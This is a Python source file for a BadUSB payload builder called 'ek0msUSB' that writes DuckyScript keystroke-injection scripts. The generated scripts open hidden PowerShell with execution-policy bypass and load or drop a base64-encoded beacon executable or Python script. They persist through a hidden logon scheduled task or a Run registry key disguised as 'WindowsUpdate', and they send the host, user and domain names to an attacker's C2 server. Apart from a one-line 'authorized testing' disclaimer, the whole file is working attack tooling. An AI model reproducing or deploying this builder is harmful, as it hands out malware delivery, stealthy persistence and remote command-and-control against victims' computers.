#!/usr/bin/env python3
"""
ek0msUSB Payload Builder - Creates BadUSB payloads with generated beacons
"""

import os
import base64
import argparse
import tempfile
from pathlib import Path

class PayloadBuilder:
    def __init__(self):
        self.payload_types = {
            'in_memory': 'Reflective loading (stealthy)',
            'disk_based': 'Traditional file drop (reliable)',
            'hybrid': 'Combination approach (balanced)'
        }
        
        self.beacon_types = {
            'simple': 'Basic beacon with console (testing)',
            'stealth': 'Stealthy beacon (no console)',
            'advanced': 'Advanced beacon with command execution'
        }

    def _compile_beacon(self, beacon_type='simple', c2_url=None):
        """Generate and compile a beacon to EXE with fallback"""
        if not c2_url:
            raise ValueError("C2 URL is required")
        
        try:
            # Use the beacon generator with fallback
            from generators.beacon_generator import BeaconGenerator
            beacon_gen = BeaconGenerator()
            
            # This will try PyInstaller first, then fallback to Python
            beacon_path = beacon_gen.compile_beacon(beacon_type, c2_url)
            
            if beacon_path.endswith('.exe'):
                print(f"[+] Using compiled EXE beacon: {beacon_path}")
                return beacon_path, 'exe'
            else:
                print(f"[+] Using Python-based beacon: {beacon_path}")
                return beacon_path, 'python'
                
        except Exception as e:
            print(f"[-] Beacon generation failed: {e}")
            raise

    def _handle_python_beacon(self, beacon_path, beacon_type, c2_url):
        """Handle Python beacon payload generation"""
        # Read the encoded Python beacon from the file
        with open(beacon_path, 'r') as f:
            lines = f.readlines()
            encoded_python = None
            for line in lines:
                if line.startswith('ENCODED_BEACON='):
                    encoded_python = line.split('=')[1].strip()
                    break
        
        if not encoded_python:
            raise Exception("Could not extract encoded Python beacon from file")
        
        return encoded_python

    def build_badusb_script(self, beacon_type='simple', payload_type='in_memory', 
                           output_name="WindowsUpdate", c2_url=None):
        """Build complete BadUSB DuckyScript with generated beacon"""
        
        if not c2_url or c2_url == "YOUR_C2_SERVER_URL_HERE":
            raise ValueError("C2 URL must be specified")
        
        print(f"[*] Generating {beacon_type} beacon for C2: {c2_url}")
        
        # Generate the beacon (EXE or Python)
        beacon_path, beacon_format = self._compile_beacon(beacon_type, c2_url)
        
        if not beacon_path or not os.path.exists(beacon_path):
            raise Exception(f"Failed to generate beacon: {beacon_path}")
        
        try:
            if beacon_format == 'exe':
                # Read and encode the generated EXE beacon
                with open(beacon_path, 'rb') as f:
                    payload_data = f.read()
                b64_payload = base64.b64encode(payload_data).decode('utf-8')
                
                print(f"[+] EXE beacon generated successfully: {os.path.getsize(beacon_path)} bytes")
                print(f"[+] Building {payload_type} BadUSB payload...")
                
                # Build the script based on type
                if payload_type == 'in_memory':
                    return self._build_in_memory_exe_payload(b64_payload, output_name, c2_url)
                elif payload_type == 'disk_based':
                    return self._build_disk_based_exe_payload(b64_payload, output_name, c2_url)
                else:
                    return self._build_hybrid_exe_payload(b64_payload, output_name, c2_url)
                    
            else:  # python format
                # Get the encoded Python beacon
                encoded_python = self._handle_python_beacon(beacon_path, beacon_type, c2_url)
                
                print(f"[+] Python beacon generated successfully")
                print(f"[+] Building {payload_type} BadUSB payload...")
                
                # Build Python-based payloads
                if payload_type == 'in_memory':
                    return self._build_in_memory_python_payload(encoded_python, output_name, c2_url)
                elif payload_type == 'disk_based':
                    return self._build_disk_based_python_payload(encoded_python, output_name, c2_url)
                else:
                    return self._build_hybrid_python_payload(encoded_python, output_name, c2_url)
                
        except Exception as e:
            print(f"[-] Payload building failed: {e}")
            raise

    # ========== EXE-BASED PAYLOAD METHODS ==========

    def _build_in_memory_exe_payload(self, b64_payload, output_name, c2_url):
        """Build in-memory payload with EXE beacon"""
        
        # Split the payload into chunks to avoid DuckyScript limits
        payload_chunks = [b64_payload[i:i+2000] for i in range(0, len(b64_payload), 2000)]
        payload_var = f"${output_name}Payload"
        
        script = f'''# ek0msUSB In-Memory Payload WITH C2
# Generated by ek0msSavi0r Framework
# C2 URL: {c2_url}
# Beacon Type: EXE (Compiled)
# WARNING: For authorized testing only

DELAY 3000
REM -- Attempt multiple execution methods
GUI r
DELAY 1000
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
STRING function Invoke-MemoryLoad {{
STRING     param([string]`$B64Data)
STRING     `$bytes = [Convert]::FromBase64String(`$B64Data)
STRING     `$assem = [System.Reflection.Assembly]::Load(`$bytes)
STRING     `$entry = `$assem.EntryPoint
STRING     if (`$entry.GetParameters().Length -eq 0) {{
STRING         `$entry.Invoke(`$null, @())
STRING     }} else {{
STRING         `$entry.Invoke(`$null, @(,[string[]]@()))
STRING     }}
STRING }}
STRING 
STRING function Send-Beacon {{
STRING     param([string]`$C2Url)
STRING     try {{
STRING         `$systemInfo = @{{
STRING             hostname = `$env:COMPUTERNAME
STRING             username = `$env:USERNAME
STRING             domain = `$env:USERDOMAIN
STRING             os = (Get-WmiObject Win32_OperatingSystem).Caption
STRING         }} | ConvertTo-Json
STRING         
STRING         `$response = Invoke-WebRequest -Uri \"`$C2Url/beacon\" -Method Post -Body `$systemInfo -ContentType \"application/json\" -UseBasicParsing
STRING         return `$response.Content
STRING     }} catch {{ return `$null }}
STRING }}
STRING 
STRING # Build payload from chunks
STRING {payload_var} = '{payload_chunks[0]}'
'''
        
        # Add remaining payload chunks
        for i, chunk in enumerate(payload_chunks[1:], 1):
            script += f"STRING {payload_var} += '{chunk}'\n"
        
        script += f'''
STRING # Persistence setup with C2 beaconing
STRING `$loaderPath = \"`$env:APPDATA\\\\Microsoft\\\\Windows\\\\{output_name}.ps1\"
STRING `$loaderContent = @\"
STRING function Invoke-MemoryLoad {{ param([string]`$B64Data) `$bytes = [Convert]::FromBase64String(`$B64Data); `$assem = [System.Reflection.Assembly]::Load(`$bytes); `$entry = `$assem.EntryPoint; if (`$entry.GetParameters().Length -eq 0) {{ `$entry.Invoke(`$null, @()) }} else {{ `$entry.Invoke(`$null, @(,[string[]]@())) }} }}
STRING function Send-Beacon {{ param([string]`$C2Url) try {{ `$systemInfo = @{{ hostname = `$env:COMPUTERNAME; username = `$env:USERNAME }} | ConvertTo-Json; `$response = Invoke-WebRequest -Uri \"`$C2Url/beacon\" -Method Post -Body `$systemInfo -ContentType \"application/json\" -UseBasicParsing; return `$response.Content }} catch {{ return `$null }} }}
STRING Invoke-MemoryLoad -B64Data '{b64_payload}'
STRING Start-Sleep 10
STRING Send-Beacon -C2Url \"{c2_url}\"
STRING \"@
STRING Set-Content -Path `$loaderPath -Value `$loaderContent -Force
STRING 
STRING # Scheduled task for persistence
STRING `$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument \"-WindowStyle Hidden -File `\"`$loaderPath`\"\"
STRING `$trigger = New-ScheduledTaskTrigger -AtLogOn
STRING `$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
STRING Register-ScheduledTask -TaskName \"{output_name}Manager\" -Action `$action -Trigger `$trigger -Settings `$settings -Force | Out-Null
STRING 
STRING # Execute now and send initial beacon
STRING Invoke-MemoryLoad -B64Data {payload_var}
STRING Start-Sleep 5
STRING Send-Beacon -C2Url \"{c2_url}\"
STRING "
ENTER
'''
        return script

    def _build_disk_based_exe_payload(self, b64_payload, output_name, c2_url):
        """Build traditional disk-based payload with EXE beacon"""
        return f'''# ek0msUSB Disk-Based Payload WITH C2
# Generated by ek0msSavi0r Framework
# C2 URL: {c2_url}
# Beacon Type: EXE (Compiled)

DELAY 3000
GUI r
DELAY 1000
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
STRING function Send-Beacon {{
STRING     param([string]`$C2Url)
STRING     try {{
STRING         `$systemInfo = @{{
STRING             hostname = `$env:COMPUTERNAME
STRING             username = `$env:USERNAME
STRING             domain = `$env:USERDOMAIN
STRING         }} | ConvertTo-Json
STRING         Invoke-WebRequest -Uri \"`$C2Url/beacon\" -Method Post -Body `$systemInfo -ContentType \"application/json\" -UseBasicParsing | Out-Null
STRING     }} catch {{ }}
STRING }}
STRING 
STRING `$payload = '{b64_payload}'
STRING `$path = \"`$env:APPDATA\\\\Microsoft\\\\Windows\\\\{output_name}.exe\"
STRING `$bytes = [Convert]::FromBase64String(`$payload)
STRING [IO.File]::WriteAllBytes(`$path, `$bytes)
STRING 
STRING # Add to startup
STRING reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"{output_name}\" /t REG_SZ /d `$path /f
STRING 
STRING # Execute and beacon
STRING Start-Process -FilePath `$path -WindowStyle Hidden
STRING Start-Sleep 10
STRING Send-Beacon -C2Url \"{c2_url}\"
STRING "
ENTER
'''

    def _build_hybrid_exe_payload(self, b64_payload, output_name, c2_url):
        """Build hybrid payload with EXE beacon"""
        return self._build_in_memory_exe_payload(b64_payload, output_name, c2_url)

    # ========== PYTHON-BASED PAYLOAD METHODS ==========

    def _build_in_memory_python_payload(self, encoded_python, output_name, c2_url):
        """Build in-memory payload with Python beacon"""
        script = f'''# ek0msUSB Python Beacon Payload
# Generated by ek0msSavi0r Framework
# C2 URL: {c2_url}
# Beacon Type: Python Script
# WARNING: For authorized testing only

DELAY 3000
GUI r
DELAY 1000
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
STRING function Start-PythonBeacon {{
STRING     param([string]`$B64PythonCode, [string]`$C2Url)
STRING     
STRING     # Decode Python code
STRING     `$pythonCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$B64PythonCode))
STRING     
STRING     # Write to temporary file
STRING     `$tempDir = `$env:TEMP
STRING     `$pythonFile = Join-Path `$tempDir \"{output_name}.py\"
STRING     Set-Content -Path `$pythonFile -Value `$pythonCode -Encoding UTF8
STRING     
STRING     # Check for Python
STRING     `$pythonExe = `$null
STRING     if (Get-Command python -ErrorAction SilentlyContinue) {{ `$pythonExe = \"python\" }}
STRING     elseif (Get-Command py -ErrorAction SilentlyContinue) {{ `$pythonExe = \"py\" }}
STRING     else {{
STRING         # Try to find Python in common locations
STRING         `$possiblePaths = @(
STRING             \"`$env:LOCALAPPDATA\\\\Programs\\\\Python\\\\Python39\\\\python.exe\",
STRING             \"`$env:LOCALAPPDATA\\\\Programs\\\\Python\\\\Python310\\\\python.exe\", 
STRING             \"`$env:LOCALAPPDATA\\\\Programs\\\\Python\\\\Python311\\\\python.exe\",
STRING             \"C:\\\\Python39\\\\python.exe\",
STRING             \"C:\\\\Python310\\\\python.exe\"
STRING         )
STRING         foreach (`$path in `$possiblePaths) {{
STRING             if (Test-Path `$path) {{ `$pythonExe = `$path; break }}
STRING         }}
STRING     }}
STRING     
STRING     if (`$pythonExe) {{
STRING         # Execute Python beacon hidden
STRING         Start-Process -FilePath `$pythonExe -ArgumentList `$pythonFile -WindowStyle Hidden
STRING         return `$true
STRING     }} else {{
STRING         # Python not found - install or use alternative
STRING         return `$false
STRING     }}
STRING }}
STRING 
STRING function Send-Beacon {{
STRING     param([string]`$C2Url)
STRING     try {{
STRING         `$systemInfo = @{{
STRING             hostname = `$env:COMPUTERNAME
STRING             username = `$env:USERNAME
STRING             domain = `$env:USERDOMAIN
STRING         }} | ConvertTo-Json
STRING         Invoke-WebRequest -Uri \"`$C2Url/beacon\" -Method Post -Body `$systemInfo -ContentType \"application/json\" -UseBasicParsing | Out-Null
STRING     }} catch {{ }}
STRING }}
STRING 
STRING # Execute Python beacon
STRING `$b64Code = \"{encoded_python}\"
STRING `$success = Start-PythonBeacon -B64PythonCode `$b64Code -C2Url \"{c2_url}\"
STRING 
STRING # Send initial beacon
STRING if (`$success) {{
STRING     Start-Sleep 10
STRING     Send-Beacon -C2Url \"{c2_url}\"
STRING }} else {{
STRING     # Fallback: Try to install Python or use alternative method
STRING     Write-Host \"Python not found - consider adding auto-install logic\"
STRING }}
STRING "
ENTER
'''
        return script

    def _build_disk_based_python_payload(self, encoded_python, output_name, c2_url):
        """Build disk-based payload with Python beacon"""
        script = f'''# ek0msUSB Python Disk-Based Payload
# Generated by ek0msSavi0r Framework
# C2 URL: {c2_url}
# Beacon Type: Python Script

DELAY 3000
GUI r
DELAY 1000
STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
STRING function Start-PythonBeacon {{
STRING     param([string]`$B64PythonCode, [string]`$C2Url)
STRING     
STRING     # Decode and save Python beacon
STRING     `$pythonCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$B64PythonCode))
STRING     `$beaconPath = \"`$env:APPDATA\\\\Microsoft\\\\Windows\\\\{output_name}.py\"
STRING     Set-Content -Path `$beaconPath -Value `$pythonCode -Encoding UTF8
STRING     
STRING     # Create batch file to run Python beacon
STRING     `$batchContent = @\"
STRING @echo off
STRING chcp 65001 >nul
STRING python \"%APPDATA%\\\\Microsoft\\\\Windows\\\\{output_name}.py\"
STRING \"@
STRING     `$batchPath = \"`$env:APPDATA\\\\Microsoft\\\\Windows\\\\{output_name}.bat\"
STRING     Set-Content -Path `$batchPath -Value `$batchContent
STRING     
STRING     # Add to startup
STRING     reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"{output_name}\" /t REG_SZ /d `$batchPath /f
STRING     
STRING     # Execute now
STRING     Start-Process -FilePath \"python\" -ArgumentList `$beaconPath -WindowStyle Hidden
STRING     return `$true
STRING }}
STRING 
STRING function Send-Beacon {{
STRING     param([string]`$C2Url)
STRING     try {{
STRING         `$systemInfo = @{{
STRING             hostname = `$env:COMPUTERNAME
STRING             username = `$env:USERNAME
STRING         }} | ConvertTo-Json
STRING         Invoke-WebRequest -Uri \"`$C2Url/beacon\" -Method Post -Body `$systemInfo -ContentType \"application/json\" -UseBasicParsing | Out-Null
STRING     }} catch {{ }}
STRING }}
STRING 
STRING # Deploy Python beacon
STRING `$b64Code = \"{encoded_python}\"
STRING Start-PythonBeacon -B64PythonCode `$b64Code -C2Url \"{c2_url}\"
STRING Start-Sleep 10
STRING Send-Beacon -C2Url \"{c2_url}\"
STRING "
ENTER
'''
        return script

    def _build_hybrid_python_payload(self, encoded_python, output_name, c2_url):
        """Build hybrid payload with Python beacon"""
        return self._build_in_memory_python_payload(encoded_python, output_name, c2_url)

# Test function
def test_builder():
    """Test the payload builder with generated beacon"""
    builder = PayloadBuilder()
    
    try:
        script = builder.build_badusb_script('simple', 'in_memory', c2_url="http://localhost:5000")
        print("Payload built successfully!")
        return script
    except Exception as e:
        print(f"Error building payload: {e}")
        return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='ek0msUSB Payload Builder')
    parser.add_argument('--test', action='store_true', help='Run test')
    parser.add_argument('--beacon-type', choices=['simple', 'stealth', 'advanced'], default='simple', help='Beacon type to generate')
    parser.add_argument('--payload-type', choices=['in_memory', 'disk_based', 'hybrid'], default='in_memory', help='Delivery method')
    parser.add_argument('--output-name', default='WindowsUpdate', help='Output name for persistence')
    parser.add_argument('--c2-url', required=True, help='C2 server URL')
    parser.add_argument('--output-file', default='payload.txt', help='Output DuckyScript file')
    
    args = parser.parse_args()
    
    if args.test:
        test_builder()
    else:
        builder = PayloadBuilder()
        try:
            script = builder.build_badusb_script(
                args.beacon_type, 
                args.payload_type, 
                args.output_name, 
                args.c2_url
            )
            with open(args.output_file, 'w') as f:
                f.write(script)
            print(f"[+] Payload built: {args.output_file}")
            print(f"[+] Beacon Type: {args.beacon_type}")
            print(f"[+] Delivery Method: {args.payload_type}")
            print(f"[+] C2 URL: {args.c2_url}")
        except Exception as e:
            print(f"[-] Error: {e}")

